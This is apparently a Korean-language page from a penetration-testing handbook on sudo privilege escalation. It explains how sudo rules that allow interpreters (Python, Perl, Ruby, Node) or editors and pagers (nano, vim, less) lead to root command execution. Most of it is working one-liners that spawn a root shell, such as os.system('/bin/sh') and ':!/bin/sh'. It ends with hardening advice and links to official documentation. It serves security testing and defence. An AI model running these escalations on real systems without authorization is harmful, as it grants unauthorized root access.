# Sudo Command Abuse

## Sudo 허용 인터프리터

`sudo -l`이 사용자가 root로 인터프리터를 실행하도록 허용한다면, 이를 직접적인 code execution으로 간주해야 합니다. 인터프리터는 arbitrary code를 실행하도록 설계되었으므로, `python3`, `perl`, `ruby`, `lua`, `node` 또는 이와 유사한 binary의 실행을 허용하는 rule은 일반적으로 root command execution과 동일합니다. 단, arguments가 엄격하게 제한되고 검증되는 경우는 예외입니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

일반적인 검토 흐름은 먼저 사용자의 privileges를 나열한 다음, 인터프리터의 `-c` option을 사용해 Python statement를 실행하는 것입니다.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
다른 interpreter 예시는 아래에 나와 있으며, 나열된 interpreter는 inline-code 실행 또는 child-process API를 문서화합니다.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
정확한 경로가 중요합니다. sudo 규칙이 `/usr/bin/python3`을 허용한다면, 검증 중에 정확히 해당 경로를 사용하세요.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo 허용 editors

`sudo -l`에서 사용자가 root 권한으로 대화형 editor를 실행할 수 있다면, 이를 무해한 파일 편집 권한이 아니라 command 실행 표면으로 간주해야 합니다. editor는 내부에서 shell 명령을 실행하거나, 임의의 파일을 읽고 쓰거나, 외부 helper를 호출할 수 있는 경우가 많습니다.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

일반적인 검토 흐름: 사용자의 권한을 나열한 다음, sudo를 사용해 허용된 각 editor 또는 pager를 실행합니다.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano`가 sudo를 통해 허용되면 editor 인터페이스에서 command execution이 가능할 수 있습니다.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
그런 다음 nano 명령 프롬프트에 `id` 또는 `/bin/sh`와 같은 명령을 입력합니다.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
대화형 shell에 사용할 수 있는 terminal stream이 없는 경우, 이 redirection 형식은 표준 출력과 표준 오류를 descriptor 0에 매핑합니다.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
nano 버전과 빌드 옵션에 따라 정확한 키 입력 순서는 달라질 수 있지만, 보안 문제는 동일합니다. editor가 root 권한으로 실행 중이며 external commands를 호출할 수 있습니다.<sup>[[1]](#references)[[12]](#references)</sup>

### 기타 일반적인 editor 탈출 방법

Vim-style editors는 일반적으로 `:!`를 통한 command execution을 제공합니다.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
`less`와 같은 Pagers는 shell 실행도 노출할 수 있습니다.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## 방어 참고 사항

- sudo를 통해 interpreters 또는 interactive editors를 허용하지 마세요.<sup>[[1]](#references)</sup>
- 하나의 제한적인 administrative action만 수행하는, 고정된 root 소유 wrapper를 우선 사용하세요.<sup>[[1]](#references)[[2]](#references)</sup>
- interpreter가 불가피한 경우, 정확한 script path를 제한하고 사용자가 제어하는 arguments, writable imports, `PYTHONPATH`, 안전하지 않은 environment 보존을 차단하세요.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- file editing이 필요한 경우, 정확한 file path를 제한하고 patched sudo versions 및 엄격한 environment handling과 함께 `sudoedit` 사용을 고려하세요.<sup>[[1]](#references)[[2]](#references)</sup>
- `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, logging을 검토하되, 이를 완전한 sandbox로 간주하지 마세요.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Python documentation](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Miscellaneous operating system interfaces — Python documentation](https://docs.python.org/3/library/os.html)
- [5] [perlrun — Perl interpreter 실행 방법](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl documentation](https://perldoc.perl.org/functions/exec)
- [7] [Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby documentation](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Node.js documentation](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js documentation](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua man page](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux manual page](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
